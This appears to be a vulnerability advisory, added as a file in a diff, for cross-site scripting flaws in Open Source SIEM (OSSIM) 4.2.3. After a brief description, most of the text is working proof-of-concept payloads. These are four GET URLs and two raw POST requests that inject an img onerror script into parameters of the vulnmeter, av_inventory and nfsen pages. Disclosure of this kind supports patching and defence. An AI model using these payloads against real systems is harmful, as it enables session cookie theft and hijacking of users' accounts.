@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/61456/info
+
+Open Source SIEM (OSSIM) is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Open Source SIEM (OSSIM) 4.2.3 is vulnerable; other versions may also be affected.
+
+https://
+<IP>/ossim/vulnmeter/index.php?withoutmenu=%22%3E%3Cimg%20src%3da%20onerror%3dalert%28%27XSS%27%29%3E
+https://
+<IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu="><img%20src%3da%20onerror%3dalert('XSS')>
+https://
+<IP>/ossim/av_inventory/task_edit.php?section="><img%20src%3da%20onerror%3dalert('XSS')>
+https://
+<IP>/ossim/nfsen/rrdgraph.php?cmd=get-detailsgraph&profile=<img%20src%3da%20onerror%3dalert('XSS')>
+
+POST /ossim/vulnmeter/simulate.php HTTP/1.1
+Host: <IP>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0)
+Gecko/20100101 Firefox/21.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://
+<IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu=1
+Content-Length: 72
+Cookie: JXID=blahblah; JXHID=false; PHPSESSID=blahblah
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+hosts_alive=1&scan_locally=1&not_resolve=0&scan_server=<img%20src%3da%20onerror%3dalert('XSS')>&targets=blah
+
+
+POST /ossim/vulnmeter/simulate.php HTTP/1.1
+Host: <IP>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0)
+Gecko/20100101 Firefox/21.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://
+<IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu=1
+Content-Length: 72
+Cookie: JXID=blahblah; JXHID=false; PHPSESSID=blahblah
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+hosts_alive=1&scan_locally=1&not_resolve=0&scan_server=Null&targets=blah<img%20src%3da%20onerror%3dalert('XSS')>
+
+
